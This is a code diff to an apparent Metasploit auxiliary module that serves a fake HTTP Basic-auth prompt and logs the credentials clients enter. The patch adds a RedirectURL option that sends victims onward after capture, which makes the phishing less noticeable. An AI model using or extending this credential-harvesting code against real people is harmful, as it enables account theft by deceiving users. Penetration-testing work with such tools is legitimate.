@@ -39,7 +39,8 @@ class Metasploit3 < Msf::Auxiliary
     register_options(
       [
         OptPort.new('SRVPORT', [ true, "The local port to listen on.", 80 ]),
-        OptString.new('REALM', [ true, "The authentication realm you'd like to present.", "Secure Site" ])
+        OptString.new('REALM', [ true, "The authentication realm you'd like to present.", "Secure Site" ]),
+        OptString.new('RedirectURL', [ false, "The page to redirect users to after they enter basic auth creds" ])
       ], self.class)
   end
 
@@ -73,9 +74,14 @@ class Metasploit3 < Msf::Auxiliary
       )
 
       print_good("#{cli.peerhost} - Credential collected: \"#{user}:#{pass}\" => #{req.resource}")
-      send_not_found(cli)
+      if datastore['RedirectURL']
+        print_status("Redirecting client #{cli.peerhost} to #{datastore['RedirectURL']}")
+        send_redirect(cli, datastore['RedirectURL'])
+      else
+        send_not_found(cli)
+      end
     else
-      print_status("Sending 401 to client")
+      print_status("Sending 401 to client #{cli.peerhost}")
       response = create_response(401, "Unauthorized")
       response.headers['WWW-Authenticate'] = "Basic realm=\"#{@realm}\""
       cli.send_response(response)
